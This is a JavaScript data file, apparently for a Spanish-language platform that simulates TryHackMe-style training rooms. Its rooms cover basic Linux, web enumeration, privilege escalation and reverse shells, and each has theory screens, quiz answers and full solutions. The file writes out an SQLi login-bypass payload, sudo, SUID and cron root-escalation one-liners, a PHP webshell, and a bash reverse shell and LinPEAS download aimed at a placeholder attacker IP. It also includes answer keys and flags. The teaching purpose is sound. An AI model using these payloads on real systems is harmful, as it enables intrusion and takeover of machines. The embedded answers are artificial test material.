// ============================================================
// HACKFORGE — THM SALAS SIMULADAS
// Incluye pantallas de preparación con teoría antes de cada sala
// ============================================================

export const THM_SALAS = [

  // ──────────────────────────────────────────────────────────
  // SALA 1 — BASIC LINUX
  // ──────────────────────────────────────────────────────────
  {
    id: "basic-linux",
    nombre: "Basic Linux",
    descripcion: "Tu primera máquina Linux. Aprende a moverte por el sistema de archivos, encontrar archivos ocultos y leer flags.",
    dificultad: "Fácil",
    xp: 200,
    tiempo: "30 min",
    color: "#4ade80",
    icon: "🟢",
    tags: ["Linux", "Fundamentos", "Flags"],
    historia: `Has obtenido acceso SSH a un servidor Linux básico.
Tu objetivo: encontrar las dos flags ocultas en el sistema.

IP del objetivo: 10.10.10.10
Usuario: waldo | Contraseña: waldo123

¡Buena suerte, hacker!`,

    preparacion: {
      titulo: "Antes de empezar — Basic Linux",
      descripcion: "Esta sala es para principiantes absolutos. Antes de entrar, asegúrate de entender estos conceptos:",
      secciones: [
        {
          titulo: "¿Qué es una flag?",
          icono: "🚩",
          color: "#4ade80",
          contenido: `En CTFs y TryHackMe, una flag es un texto con formato especial que prueba que comprometiste algo.

Formato típico: THM{texto_aqui}

En las máquinas Linux hay dos flags principales:
• user.txt  → flag del usuario normal
• root.txt  → flag del administrador (root)

Tu objetivo siempre es leer esos archivos.`
        },
        {
          titulo: "Comandos que vas a usar",
          icono: "💻",
          color: "#38bdf8",
          contenido: `Estos son los únicos comandos que necesitas para esta sala:

whoami          → muestra tu usuario actual
pwd             → muestra en qué directorio estás
ls              → lista archivos del directorio actual
ls -la          → lista TODOS los archivos (incluye ocultos)
cd carpeta      → entra a una carpeta
cd ..           → sube un nivel
cat archivo     → lee el contenido de un archivo
find / -name archivo 2>/dev/null  → busca un archivo

Los archivos ocultos en Linux empiezan con punto (.)
Ejemplo: .secreto, .bash_history, .ssh`
        },
        {
          titulo: "Estructura del sistema Linux",
          icono: "📁",
          color: "#f59e0b",
          contenido: `Linux organiza todo en carpetas. Las más importantes:

/               → raíz del sistema (todo parte desde aquí)
/home/          → carpetas de los usuarios
/home/waldo/    → tu carpeta personal
/etc/           → archivos de configuración
/root/          → carpeta del administrador (root)
/tmp/           → archivos temporales

Cuando entras a una máquina, siempre empiezas en /home/tuusuario
Desde ahí exploras el sistema con ls y cd.`
        },
        {
          titulo: "Metodología para esta sala",
          icono: "🗺️",
          color: "#a78bfa",
          contenido: `Sigue estos pasos en orden:

1. whoami         → ¿quién soy?
2. pwd            → ¿dónde estoy?
3. ls -la         → ¿qué hay aquí? (busca archivos ocultos)
4. cat user.txt   → leer la flag de usuario
5. cd /etc        → explorar configuración
6. cat /etc/hostname → nombre del sistema
7. grep '/bin/bash' /etc/passwd → contar usuarios
8. find /home -name '*.txt' 2>/dev/null → buscar más flags

Recuerda: si un archivo empieza con punto (.) es oculto.
Solo ls -la los muestra.`
        }
      ],
      comandos_clave: [
        { cmd: "whoami", desc: "Ver usuario actual" },
        { cmd: "ls -la", desc: "Listar archivos ocultos" },
        { cmd: "cat archivo.txt", desc: "Leer archivo" },
        { cmd: "find / -name '*.txt' 2>/dev/null", desc: "Buscar archivos .txt" },
        { cmd: "grep '/bin/bash' /etc/passwd", desc: "Contar usuarios con bash" }
      ]
    },

    tareas: [
      {
        id: 1,
        titulo: "Task 1 — Orientación",
        descripcion: "Primero necesitas saber dónde estás y qué hay en el sistema.",
        preguntas: [
          { pregunta: "¿Cuál es el nombre del usuario actual?", respuesta: "waldo", pista: "Usa el comando whoami" },
          { pregunta: "¿En qué directorio estás al iniciar?", respuesta: "/home/waldo", pista: "Usa pwd para ver tu ubicación actual" },
          { pregunta: "¿Cuántos archivos hay en el directorio home (incluyendo ocultos)?", respuesta: "5", pista: "Usa ls -la y cuenta todos los archivos" }
        ]
      },
      {
        id: 2,
        titulo: "Task 2 — Archivos ocultos",
        descripcion: "Los archivos ocultos en Linux empiezan con punto. Búscalos.",
        preguntas: [
          { pregunta: "¿Cuál es el nombre del archivo oculto en /home/waldo?", respuesta: ".secreto", pista: "ls -la muestra archivos ocultos (empiezan con .)" },
          { pregunta: "¿Qué contiene el archivo .secreto?", respuesta: "THM{h1dd3n_f1l3s_4r3_fun}", pista: "cat .secreto" }
        ]
      },
      {
        id: 3,
        titulo: "Task 3 — Explorando el sistema",
        descripcion: "Busca la flag de usuario en el sistema.",
        preguntas: [
          { pregunta: "¿Qué hay en /etc/hostname?", respuesta: "basic-linux", pista: "cat /etc/hostname" },
          { pregunta: "¿Cuántos usuarios tienen /bin/bash como shell?", respuesta: "2", pista: "grep /bin/bash /etc/passwd | wc -l" },
          { pregunta: "¿Cuál es la user flag?", respuesta: "THM{b4s1c_l1nux_n00b_t0_h4ck3r}", pista: "cat /home/waldo/user.txt" }
        ]
      }
    ],

    sistema: {
      usuario: "waldo", hostname: "basic-linux",
      directorio_inicial: "/home/waldo",
      archivos: {
        "/home/waldo": ["user.txt", "notas.txt", ".secreto", ".bash_history", "Desktop/"],
        "/home/waldo/Desktop": ["importante.txt"],
        "/etc": ["passwd", "shadow", "hostname", "hosts"],
        "/tmp": [], "/root": ["root.txt"], "/home": ["waldo"]
      },
      contenido: {
        "user.txt": "THM{b4s1c_l1nux_n00b_t0_h4ck3r}",
        "notas.txt": "Recordatorios:\n- Cambiar contraseña\n- Actualizar sistema\n- Revisar logs",
        ".secreto": "THM{h1dd3n_f1l3s_4r3_fun}",
        ".bash_history": "ls -la\npwd\ncd Desktop\ncat importante.txt\ncd ..\nsudo -l\n",
        "importante.txt": "Informacion importante del proyecto.\nVersion: 1.0",
        "passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/nologin\nwaldo:x:1000:1000::/home/waldo:/bin/bash",
        "hostname": "basic-linux",
        "hosts": "127.0.0.1 localhost\n127.0.1.1 basic-linux",
        "root.txt": "THM{r00t_fl4g_s00n_y0u_w1ll_g3t_m3}",
        "shadow": "root:$6$salt$hash_root:18000:::\nwaldo:$6$salt$hash_waldo:18500:::"
      },
      sudo_config: "(ALL) NOPASSWD: /usr/bin/find",
      suid_binarios: ["/usr/bin/sudo", "/usr/bin/passwd", "/usr/bin/find"]
    },

    solucion_completa: `# Solución — Basic Linux
whoami                                    # waldo
pwd                                       # /home/waldo
ls -la                                    # ver .secreto
cat .secreto                              # THM{h1dd3n_f1l3s_4r3_fun}
cat /etc/hostname                         # basic-linux
grep '/bin/bash' /etc/passwd | wc -l     # 2
cat /home/waldo/user.txt                  # THM{b4s1c_l1nux_n00b_t0_h4ck3r}`
  },

  // ──────────────────────────────────────────────────────────
  // SALA 2 — WEB ENUM
  // ──────────────────────────────────────────────────────────
  {
    id: "web-enum",
    nombre: "Web Enumeration",
    descripcion: "Enumera un servidor web. Encuentra directorios ocultos, credenciales y explota una vulnerabilidad SQLi básica.",
    dificultad: "Fácil",
    xp: 300,
    tiempo: "45 min",
    color: "#38bdf8",
    icon: "🌐",
    tags: ["Web", "SQLi", "gobuster", "Enumeración"],
    historia: `Has encontrado un servidor web corriendo en el puerto 80.
No tienes credenciales. Debes enumerar y explotar.

IP del objetivo: 10.10.20.20
Puerto 80: Apache 2.4.29
Puerto 22: OpenSSH 7.6`,

    preparacion: {
      titulo: "Antes de empezar — Web Enumeration",
      descripcion: "Esta sala cubre enumeración web básica. Aprende estas herramientas y técnicas antes de entrar:",
      secciones: [
        {
          titulo: "¿Qué es la enumeración web?",
          icono: "🔍",
          color: "#38bdf8",
          contenido: `Enumerar una web significa descubrir todo lo que tiene:
rutas ocultas, archivos, tecnologías, credenciales, etc.

El proceso siempre es:
1. nmap → ¿qué puertos/servicios tiene la máquina?
2. curl robots.txt → ¿qué rutas intenta ocultar?
3. gobuster → buscar directorios y archivos ocultos
4. Revisar código fuente → comentarios con credenciales
5. Explotar lo que encontraste

La información que encuentras en un paso te da pistas para el siguiente.`
        },
        {
          titulo: "nmap — Escanear puertos",
          icono: "📡",
          color: "#4ade80",
          contenido: `nmap descubre qué servicios tiene la máquina objetivo.

Uso básico:
nmap -sV 10.10.20.20

Resultado típico:
PORT   STATE SERVICE  VERSION
22/tcp open  ssh      OpenSSH 7.6
80/tcp open  http     Apache 2.4.29

Lo que te dice:
• Puerto 22 abierto → hay SSH (guárdalo para cuando tengas credenciales)
• Puerto 80 abierto → hay una web (empieza aquí)
• Las versiones exactas te ayudan a buscar exploits`
        },
        {
          titulo: "robots.txt — El mapa secreto",
          icono: "🤖",
          color: "#f59e0b",
          contenido: `robots.txt le dice a Google qué NO indexar.
Los admins ponen ahí las rutas más sensibles.

Siempre lo primero que revisas en una web:
curl http://10.10.20.20/robots.txt

Ejemplo de resultado:
User-agent: *
Disallow: /admin-secret/
Disallow: /backup.zip
Disallow: /.git/

Cada Disallow es una ruta interesante para explorar.`
        },
        {
          titulo: "gobuster — Fuerza bruta de directorios",
          icono: "💥",
          color: "#a78bfa",
          contenido: `gobuster prueba miles de nombres de directorios/archivos
para encontrar los que existen en el servidor.

Comando básico:
gobuster dir -u http://10.10.20.20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip

Códigos de respuesta:
• 200 = existe y es accesible ← muy interesante
• 301 = existe pero redirige (añade / al final)
• 403 = existe pero no tienes acceso (sigue siendo útil)
• 404 = no existe`
        },
        {
          titulo: "SQL Injection — Bypass de login",
          icono: "💉",
          color: "#f43f5e",
          contenido: `SQLi ocurre cuando la aplicación no valida los inputs
y los pasa directamente a la base de datos.

Bypass de autenticación más clásico:
• En campo usuario escribe: admin'--
• En contraseña: cualquier cosa

¿Por qué funciona?
La query SQL es: WHERE user='ENTRADA' AND pass='ENTRADA'
Con tu input queda: WHERE user='admin'--' AND pass='...'
El -- comenta todo lo que viene después → ignora la contraseña

Resultado: entras como admin sin saber la contraseña.`
        },
        {
          titulo: "Metodología para esta sala",
          icono: "🗺️",
          color: "#4ade80",
          contenido: `Sigue este orden exacto:

1. nmap -sV 10.10.20.20
   → Identifica puertos abiertos y versiones

2. curl http://10.10.20.20/robots.txt
   → Encuentra rutas ocultas

3. gobuster dir -u http://10.10.20.20 -w wordlist -x php,txt,zip
   → Descubre directorios y archivos

4. curl http://10.10.20.20/backup.zip
   → Lee el archivo de backup con credenciales

5. Ir al login y usar: admin'-- como usuario
   → Bypasear la autenticación con SQLi

6. Leer la flag del panel de admin`
        }
      ],
      comandos_clave: [
        { cmd: "nmap -sV 10.10.20.20", desc: "Escanear puertos y versiones" },
        { cmd: "curl http://IP/robots.txt", desc: "Ver rutas ocultas" },
        { cmd: "gobuster dir -u http://IP -w wordlist -x php,txt,zip", desc: "Buscar directorios" },
        { cmd: "curl http://IP/backup.zip", desc: "Leer archivo backup" },
        { cmd: "admin'--", desc: "Payload SQLi para bypass de login" }
      ]
    },

    tareas: [
      {
        id: 1,
        titulo: "Task 1 — Reconocimiento",
        descripcion: "Escanea la máquina y determina los servicios expuestos.",
        preguntas: [
          { pregunta: "¿Qué versión de Apache corre en el puerto 80?", respuesta: "2.4.29", pista: "Ejecuta nmap -sV 10.10.20.20 y busca el puerto 80" },
          { pregunta: "¿Cuántos puertos TCP están abiertos?", respuesta: "2", pista: "nmap -sV 10.10.20.20 — cuenta los puertos con estado 'open'" },
          { pregunta: "¿Qué ruta muestra robots.txt como Disallow?", respuesta: "/admin-secret/", pista: "curl http://10.10.20.20/robots.txt" }
        ]
      },
      {
        id: 2,
        titulo: "Task 2 — Enumeración web",
        descripcion: "Usa gobuster para descubrir directorios y archivos ocultos.",
        preguntas: [
          { pregunta: "¿Qué directorio de admin encontró gobuster?", respuesta: "/admin", pista: "gobuster dir -u http://10.10.20.20 -w wordlist" },
          { pregunta: "¿Qué archivo de backup encontraste?", respuesta: "backup.zip", pista: "Añade -x php,txt,zip al comando de gobuster" },
          { pregunta: "¿Qué credenciales están en el backup?", respuesta: "admin:password123", pista: "curl http://10.10.20.20/backup.zip" }
        ]
      },
      {
        id: 3,
        titulo: "Task 3 — SQL Injection",
        descripcion: "El panel de login es vulnerable a SQLi. Explótalo.",
        preguntas: [
          { pregunta: "¿Cuál es el payload SQLi para bypass de login?", respuesta: "admin'--", pista: "Prueba en el campo usuario: admin'-- (con comilla simple y doble guión)" },
          { pregunta: "¿Cuál es la flag del panel admin?", respuesta: "THM{w3b_3num_4nd_sql1}", pista: "Después del login exitoso, busca flag.txt en el directorio /admin" }
        ]
      }
    ],

    sistema: {
      usuario: "waldo", hostname: "web-enum",
      directorio_inicial: "/home/waldo",
      archivos: {
        "/home/waldo": [".bash_history"],
        "/var/www/html": ["index.php", "login.php", "robots.txt", "backup.zip"],
        "/var/www/html/admin": ["index.php", "flag.txt", "config.php"],
        "/var/www/html/admin-secret": ["notes.txt"],
        "/etc": ["passwd", "hostname"]
      },
      contenido: {
        ".bash_history": "nmap -sV 10.10.20.20\ncurl http://10.10.20.20/robots.txt\ngobuster dir -u http://10.10.20.20 -w wordlist\ncurl http://10.10.20.20/backup.zip\n",
        "robots.txt": "User-agent: *\nDisallow: /admin-secret/\nDisallow: /backup.zip\nDisallow: /.git/\n\n# Rutas privadas - no indexar",
        "backup.zip": "[Contenido del archivo backup.zip]\n\ncredentials.txt:\n  admin:password123\n\nconfig_old.php:\n  db_pass = 'OldPass123!'",
        "flag.txt": "THM{w3b_3num_4nd_sql1}",
        "config.php": "<?php\n$db_host = 'localhost';\n$db_user = 'webapp';\n$db_pass = 'Sup3rS3cr3t!';\n$db_name = 'webapp_db';\n?>",
        "notes.txt": "NOTAS PRIVADAS\nCredenciales emergencia: admin:emergency_backup_2024\nFlag: THM{r0b0ts_4r3_y0ur_fr13nd}",
        "hostname": "web-enum",
        "passwd": "root:x:0:0:root:/root:/bin/bash\nwaldo:x:1000:1000::/home/waldo:/bin/bash\nwww-data:x:33:33::/var/www:/nologin"
      },
      nmap_output: `Starting Nmap 7.93
Nmap scan report for 10.10.20.20
Host is up (0.045s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Servidor Web - Login

Service detection performed.`,
      gobuster_output: `/index.php      (Status: 200) [Size: 1234]
/login.php      (Status: 200) [Size: 892]
/admin          (Status: 301) [Size: 314]
/backup.zip     (Status: 200) [Size: 4521]
/robots.txt     (Status: 200) [Size: 156]`,
      sudo_config: "no sudo disponible",
      suid_binarios: ["/usr/bin/sudo", "/usr/bin/passwd"]
    },

    solucion_completa: `# Solución — Web Enumeration
nmap -sV 10.10.20.20                    # Puerto 22 y 80 abiertos
curl http://10.10.20.20/robots.txt      # /admin-secret/ y /backup.zip
gobuster dir -u http://10.10.20.20 -w wordlist -x php,txt,zip
curl http://10.10.20.20/backup.zip      # admin:password123
# En el login → usuario: admin'-- → contraseña: cualquiera
# Flag: THM{w3b_3num_4nd_sql1}`
  },

  // ──────────────────────────────────────────────────────────
  // SALA 3 — PRIVILEGE ESCALATION
  // ──────────────────────────────────────────────────────────
  {
    id: "privesc",
    nombre: "Privilege Escalation",
    descripcion: "Eres www-data. Usa vectores clásicos de privesc: sudo, SUID, crontab. Escala a root.",
    dificultad: "Medio",
    xp: 400,
    tiempo: "60 min",
    color: "#f59e0b",
    icon: "⬆️",
    tags: ["Privesc", "sudo", "SUID", "crontab"],
    historia: `Has obtenido una shell como www-data después de explotar
una vulnerabilidad en el servidor web.

Ahora necesitas escalar privilegios a root.
Hay múltiples vectores — encuéntralos todos.

Usuario actual: www-data
Objetivo: leer /root/root.txt`,

    preparacion: {
      titulo: "Antes de empezar — Privilege Escalation",
      descripcion: "Escalar privilegios significa pasar de un usuario limitado a root (administrador). Hay varios vectores clásicos — aprende todos antes de entrar:",
      secciones: [
        {
          titulo: "¿Qué es privilege escalation?",
          icono: "⬆️",
          color: "#f59e0b",
          contenido: `Cuando entras a una máquina normalmente eres un usuario limitado
(www-data, john, waldo...). Root es el administrador con acceso total.

Escalar privilegios = encontrar un error de configuración que te
permita ejecutar comandos como root.

Los vectores más comunes son:
1. sudo mal configurado → puedes ejecutar algo como root
2. Archivos SUID → se ejecutan con permisos del dueño (root)
3. Cron jobs → scripts que root ejecuta automáticamente
4. Credenciales en archivos de config → contraseña de root

Esta sala tiene los 3 primeros. Encuéntralos todos.`
        },
        {
          titulo: "Vector 1 — sudo -l",
          icono: "🔑",
          color: "#4ade80",
          contenido: `sudo permite ejecutar comandos como root.
sudo -l muestra QUÉ puedes ejecutar con sudo.

Ejecuta siempre: sudo -l

Resultado típico vulnerable:
User www-data may run:
    (ALL) NOPASSWD: /usr/bin/python3

Si puedes ejecutar python3 con sudo → escalas así:
sudo python3 -c 'import os; os.system("/bin/bash")'

Si puedes ejecutar vim con sudo:
sudo vim -c ':!/bin/bash'

Si puedes ejecutar find con sudo:
sudo find . -exec /bin/sh \; -quit

Consulta gtfobins.github.io para cada binario.`
        },
        {
          titulo: "Vector 2 — Archivos SUID",
          icono: "🔴",
          color: "#f43f5e",
          contenido: `SUID (Set User ID) hace que un archivo se ejecute con
los permisos del DUEÑO, no del usuario que lo ejecuta.

Si el dueño es root y tiene SUID → ejecución como root.

Buscar archivos SUID:
find / -perm -4000 2>/dev/null

Se identifica por la 's' en los permisos:
-rwsr-xr-x 1 root root /usr/bin/find

Si find tiene SUID:
find . -exec /bin/sh \; -quit

Si python3 tiene SUID:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

Consulta gtfobins.github.io para cada binario.`
        },
        {
          titulo: "Vector 3 — Cron jobs",
          icono: "⏰",
          color: "#38bdf8",
          contenido: `cron ejecuta comandos automáticamente según un horario.
Si root ejecuta un script que TÚ puedes modificar → escalas.

Ver tareas de cron:
cat /etc/crontab

Ejemplo vulnerable:
*/5 * * * * root /opt/cleanup.sh

Verificar si el script es escribible:
ls -la /opt/cleanup.sh
-rwxrwxrwx 1 root root cleanup.sh  ← ¡todos pueden escribir!

Explotar:
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/cleanup.sh
# Esperar 5 minutos...
/tmp/rootbash -p
# ¡Root!`
        },
        {
          titulo: "Checklist de privesc",
          icono: "✅",
          color: "#a78bfa",
          contenido: `Ejecuta esto en orden al entrar a cualquier máquina:

1. id                              → ¿quién soy?
2. sudo -l                         → ¿qué puedo hacer con sudo?
3. find / -perm -4000 2>/dev/null  → archivos SUID
4. cat /etc/crontab                → cron jobs de root
5. crontab -l                      → mis cron jobs
6. cat ~/.bash_history             → credenciales en historial
7. find / -name config.php 2>/dev/null → credenciales en configs
8. ss -tuln                        → servicios internos

LinPEAS automatiza todo esto:
wget http://TU_IP/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
./tmp/linpeas.sh`
        }
      ],
      comandos_clave: [
        { cmd: "id", desc: "Ver usuario y grupos actuales" },
        { cmd: "sudo -l", desc: "Ver permisos sudo disponibles" },
        { cmd: "find / -perm -4000 2>/dev/null", desc: "Buscar archivos SUID" },
        { cmd: "cat /etc/crontab", desc: "Ver tareas programadas de root" },
        { cmd: "sudo python3 -c 'import os; os.system(\"/bin/bash\")'", desc: "Escalar con sudo python3" }
      ]
    },

    tareas: [
      {
        id: 1,
        titulo: "Task 1 — Reconocimiento",
        descripcion: "Antes de escalar, necesitas entender el sistema.",
        preguntas: [
          { pregunta: "¿Cuál es el usuario actual?", respuesta: "www-data", pista: "whoami" },
          { pregunta: "¿Qué kernel corre el sistema?", respuesta: "5.4.0-150-generic", pista: "uname -r" },
          { pregunta: "¿Cuántos usuarios tienen shell /bin/bash?", respuesta: "2", pista: "grep /bin/bash /etc/passwd | wc -l" }
        ]
      },
      {
        id: 2,
        titulo: "Task 2 — Vector sudo",
        descripcion: "Verifica qué puedes hacer con sudo.",
        preguntas: [
          { pregunta: "¿Qué binario puedes ejecutar con sudo sin contraseña?", respuesta: "/usr/bin/python3", pista: "sudo -l" },
          { pregunta: "¿Cómo escalarías con python3 y sudo? (escribe el comando completo)", respuesta: "sudo python3 -c 'import os; os.system(\"/bin/bash\")'", pista: "GTFOBins → python3 → sudo section" }
        ]
      },
      {
        id: 3,
        titulo: "Task 3 — Vector SUID",
        descripcion: "Busca binarios con SUID que puedas explotar.",
        preguntas: [
          { pregunta: "¿Qué binario inusual tiene SUID activado?", respuesta: "/usr/bin/find", pista: "find / -perm -4000 2>/dev/null — busca algo inusual" },
          { pregunta: "¿Qué comando usas para escalar con find SUID?", respuesta: "find . -exec /bin/sh \\; -quit", pista: "GTFOBins → find → SUID section" }
        ]
      },
      {
        id: 4,
        titulo: "Task 4 — Vector crontab",
        descripcion: "Revisa las tareas programadas del sistema.",
        preguntas: [
          { pregunta: "¿Qué script ejecuta root cada 5 minutos?", respuesta: "/opt/cleanup.sh", pista: "cat /etc/crontab — busca la entrada que ejecuta root" },
          { pregunta: "¿Tiene ese script permisos de escritura para otros? (si/no)", respuesta: "si", pista: "ls -la /opt/cleanup.sh — busca -rwxrwxrwx" },
          { pregunta: "¿Cuál es la root flag?", respuesta: "THM{pr1v3sc_m4st3r_4ll_v3ct0rs}", pista: "Escala a root con sudo python3 y lee: cat /root/root.txt" }
        ]
      }
    ],

    sistema: {
      usuario: "www-data", hostname: "privesc-box",
      directorio_inicial: "/var/www/html",
      archivos: {
        "/var/www/html": ["index.php", "config.php", "uploads/"],
        "/home/john": ["user.txt", ".bash_history", "notes.txt"],
        "/opt": ["cleanup.sh", "backup.py"],
        "/etc": ["passwd", "shadow", "crontab", "hostname"],
        "/root": ["root.txt", ".bash_history"], "/tmp": []
      },
      contenido: {
        "config.php": "<?php\n$db_host = 'localhost';\n$db_user = 'webapp';\n$db_pass = 'DB_P4ssw0rd_2024!';\n// john:JohnPass123! (credenciales SSH)\n?>",
        "user.txt": "THM{us3r_fl4g_j0hn_1s_h3r3}",
        "notes.txt": "Recordatorios:\n- Renovar certificado SSL\n- Contraseña root: R00tP4ss_D0ntT3llAny0n3!\n- Backup cada lunes",
        ".bash_history": "sudo -l\ncd /opt\ncat cleanup.sh\npython3 -c 'import os'\nfind / -perm -4000 2>/dev/null\ncat /etc/crontab\n",
        "cleanup.sh": "#!/bin/bash\n# Ejecutado por root cada 5 min\n# PERMISOS: -rwxrwxrwx (escribible por todos!)\nrm -rf /tmp/*\necho 'Limpieza completada' >> /var/log/cleanup.log",
        "crontab": "SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin\n\n*/5 * * * *  root  /opt/cleanup.sh\n0   2 * * *  root  /opt/backup.py",
        "passwd": "root:x:0:0:root:/root:/bin/bash\njohn:x:1001:1001::/home/john:/bin/bash\nwww-data:x:33:33::/var/www:/nologin",
        "hostname": "privesc-box",
        "root.txt": "THM{pr1v3sc_m4st3r_4ll_v3ct0rs}",
        "shadow": "root:$6$salt$hash_root:18000:::\njohn:$6$salt$hash_john:18500:::"
      },
      sudo_config: "(ALL) NOPASSWD: /usr/bin/python3",
      suid_binarios: ["/usr/bin/sudo", "/usr/bin/passwd", "/usr/bin/find", "/usr/bin/newgrp"]
    },

    solucion_completa: `# Solución — Privilege Escalation
id                                        # www-data
uname -r                                  # 5.4.0-150-generic
grep '/bin/bash' /etc/passwd | wc -l     # 2
sudo -l                                   # (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.system("/bin/bash")'  # ROOT!
find / -perm -4000 2>/dev/null            # /usr/bin/find
find . -exec /bin/sh \\; -quit            # ROOT alternativo
cat /etc/crontab                          # */5 root /opt/cleanup.sh
ls -la /opt/cleanup.sh                    # -rwxrwxrwx (escribible)
cat /root/root.txt                        # THM{pr1v3sc_m4st3r_4ll_v3ct0rs}`
  },

  // ──────────────────────────────────────────────────────────
  // SALA 4 — REVERSE SHELL
  // ──────────────────────────────────────────────────────────
  {
    id: "reverse-shell",
    nombre: "Reverse Shell & Webshell",
    descripcion: "Sube una webshell PHP, obtén RCE y establece una reverse shell estable. Escala a root.",
    dificultad: "Medio",
    xp: 400,
    tiempo: "60 min",
    color: "#f43f5e",
    icon: "🔴",
    tags: ["Webshell", "RCE", "Reverse Shell", "PHP"],
    historia: `Has encontrado una página de subida de archivos sin validación.
Puedes subir cualquier tipo de archivo, incluyendo PHP.

IP del objetivo: 10.10.30.30
Objetivo: user.txt y root.txt`,

    preparacion: {
      titulo: "Antes de empezar — Reverse Shell & Webshell",
      descripcion: "Esta sala cubre la técnica más usada en pentesting web. Aprende cada concepto antes de entrar:",
      secciones: [
        {
          titulo: "¿Qué es una webshell?",
          icono: "🐚",
          color: "#f43f5e",
          contenido: `Una webshell es un archivo PHP que le pides al servidor
que ejecute comandos del sistema operativo.

El código más básico:
<?php system($_GET['cmd']); ?>

Cómo funciona:
1. Subes shell.php al servidor
2. Accedes: http://victima/uploads/shell.php?cmd=id
3. El servidor ejecuta 'id' y devuelve el resultado
4. Ves: uid=33(www-data)

Esto se llama Remote Code Execution (RCE).
Desde aquí puedes hacer todo lo que haría www-data.`
        },
        {
          titulo: "¿Qué es una reverse shell?",
          icono: "🔄",
          color: "#f59e0b",
          contenido: `Una reverse shell es cuando la VÍCTIMA se conecta a TI.

¿Por qué? Los firewalls bloquean conexiones entrantes
pero permiten las salientes. La víctima "llama de vuelta".

Flujo completo:
1. Tu Kali escucha: nc -lnvp 4444
2. Desde la webshell ejecutas el payload
3. La víctima se conecta a tu Kali
4. Recibes una shell interactiva

Payload de reverse shell en bash:
bash -i >& /dev/tcp/TU_IP/4444 0>&1

Tu IP = la de tun0 si usas THM (ip a | grep tun0)`
        },
        {
          titulo: "Cómo mejorar la shell",
          icono: "⬆️",
          color: "#4ade80",
          contenido: `La shell que recibes por nc es básica (no tiene Tab, etc).
Para mejorarla a una TTY completa:

Paso 1 — En la shell recibida:
python3 -c 'import pty;pty.spawn("/bin/bash")'

Paso 2 — Presiona Ctrl+Z (suspende la shell)

Paso 3 — En tu Kali:
stty raw -echo; fg

Paso 4 — En la shell mejorada:
export TERM=xterm

Ahora tienes Tab, historial y Ctrl+C funciona correctamente.`
        },
        {
          titulo: "Encontrar credenciales",
          icono: "🔍",
          color: "#a78bfa",
          contenido: `Una vez dentro como www-data, busca credenciales:

Archivos de configuración web:
cat /var/www/html/config.php
cat /var/www/html/wp-config.php

Historial de comandos:
cat ~/.bash_history

Buscar archivos con 'password':
grep -r 'password' /var/www/ 2>/dev/null
grep -r 'passwd' /etc/ 2>/dev/null

Las credenciales encontradas a veces sirven para:
• SSH como otro usuario
• sudo (si ese usuario puede sudo)
• Bases de datos`
        },
        {
          titulo: "Metodología para esta sala",
          icono: "🗺️",
          color: "#38bdf8",
          contenido: `Sigue este orden:

1. Crear shell.php con: <?php system($_GET['cmd']); ?>
2. Subir a http://10.10.30.30/upload.php
3. Verificar RCE: http://10.10.30.30/uploads/shell.php?cmd=id
4. Configurar listener: nc -lnvp 4444
5. Enviar reverse shell desde la webshell
6. Mejorar shell con python3 pty
7. Buscar credenciales en config.php
8. Usar credenciales para SSH como developer
9. sudo -l → escalar a root
10. cat /root/root.txt`
        }
      ],
      comandos_clave: [
        { cmd: "nc -lnvp 4444", desc: "Configurar listener para reverse shell" },
        { cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", desc: "Mejorar shell a TTY" },
        { cmd: "cat /var/www/html/config.php", desc: "Buscar credenciales en configuración" },
        { cmd: "sudo -l", desc: "Ver permisos sudo" },
        { cmd: "sudo python3 -c 'import os; os.system(\"/bin/bash\")'", desc: "Escalar a root" }
      ]
    },

    tareas: [
      {
        id: 1,
        titulo: "Task 1 — Webshell",
        descripcion: "Crea y sube una webshell PHP al servidor.",
        preguntas: [
          { pregunta: "¿Cuál es el contenido de una webshell PHP básica?", respuesta: "<?php system($_GET['cmd']); ?>", pista: "Una función PHP que ejecuta comandos del sistema operativo" },
          { pregunta: "¿Qué comando ejecutas primero para verificar el RCE?", respuesta: "id", pista: "?cmd=id en la URL de la webshell verifica que tienes ejecución" },
          { pregunta: "¿Qué usuario está corriendo el servidor web?", respuesta: "www-data", pista: "?cmd=whoami muestra el usuario del proceso web" }
        ]
      },
      {
        id: 2,
        titulo: "Task 2 — Reverse Shell",
        descripcion: "Establece una reverse shell para tener acceso interactivo.",
        preguntas: [
          { pregunta: "¿Qué comando configura el listener en tu Kali?", respuesta: "nc -lnvp 4444", pista: "nc con opciones: l=listen, n=no DNS, v=verbose, p=puerto" },
          { pregunta: "¿Cómo mejoras la shell básica a TTY?", respuesta: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", pista: "Usa el módulo pty de Python3 para crear un pseudo-terminal" }
        ]
      },
      {
        id: 3,
        titulo: "Task 3 — Escalada",
        descripcion: "Desde www-data, escala a root.",
        preguntas: [
          { pregunta: "¿Dónde encontraste credenciales?", respuesta: "/var/www/html/config.php", pista: "cat /var/www/html/config.php — busca contraseñas comentadas" },
          { pregunta: "¿Cuál es la user flag?", respuesta: "THM{w3bsh3ll_t0_r3v3rs3_sh3ll}", pista: "Usa las credenciales de config.php para SSH y lee user.txt" },
          { pregunta: "¿Cuál es la root flag?", respuesta: "THM{full_c0mpr0m1s3d_s3rv3r}", pista: "sudo -l → sudo python3 -c 'import os; os.system(\"/bin/bash\")' → cat /root/root.txt" }
        ]
      }
    ],

    sistema: {
      usuario: "www-data", hostname: "webshell-box",
      directorio_inicial: "/var/www/html",
      archivos: {
        "/var/www/html": ["index.php", "upload.php", "config.php", "uploads/"],
        "/var/www/html/uploads": ["imagen.jpg", "shell.php"],
        "/home/developer": ["user.txt", ".bash_history"],
        "/etc": ["passwd", "hostname", "crontab"],
        "/root": ["root.txt"], "/tmp": []
      },
      contenido: {
